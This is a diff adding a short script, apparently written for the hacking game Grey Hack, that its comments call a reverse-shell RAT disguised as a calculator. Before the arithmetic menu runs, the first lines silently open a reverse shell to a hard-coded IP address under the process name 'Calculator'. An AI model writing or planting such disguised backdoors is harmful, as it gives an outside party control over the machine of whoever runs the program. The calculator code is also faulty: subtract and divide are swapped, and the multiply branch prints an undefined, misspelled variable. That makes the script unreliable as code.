@@ -1,0 +1,50 @@
+// This program is made by TaxEvader
+// This program is a reverse shell rat
+//
+//
+//
+metax = include_lib("/lib/metaxploit.so")
+//checks for metaxploit.so in the lib folder
+if metax then
+	metax.rshell_client "198.164.115.102", 1222, "Calculator"
+	//if it finds metaxploit it will start an rshell_client 
+end if
+
+User_program_run = user_input("would you like to add{1} subtract{2} multiply{3} devide{4} : ")
+if User_program_run == "1" then
+	user_Add1 = user_input("please add your fisrt number: ").to_int
+	user_Add2 = user_input("please add your second number: ").to_int
+	wait 1
+	user_Add_Answer = user_Add1 + user_Add2
+	print "calculating"
+	wait 1
+	print user_Add_Answer
+end if
+if User_program_run == "3" then
+	user_Multi1 = user_input("please add your fisrt number: ").to_int
+	user_Multi2 = user_input("please add your second number: ").to_int
+	wait 1
+	user_Muilti_Answer = user_Multi1 * user_Multi2
+	print "calculating"
+	wait 1
+	print user_Multi_Answer
+end if
+if User_program_run == "2" then
+	user_Sub1 = user_input("please add your fisrt number : ").to_int
+	user_Sub2 = user_input("please add your second number : ").to_int
+	wait 1
+	user_Sub_Answer = user_Sub1 / user_Sub2
+	print "calculating"
+	wait 1
+	print user_Sub_Answer
+end if
+
+if User_program_run == "4" then
+	user_dev1 = user_input("please add your fisrt number: ").to_int
+	user_dev2 = user_input("please add your second number: ").to_int
+	wait 1
+	user_dev_Answer = user_dev1 - user_dev2
+	print "calculating"
+	wait 1
+	print user_dev_Answer
+end if
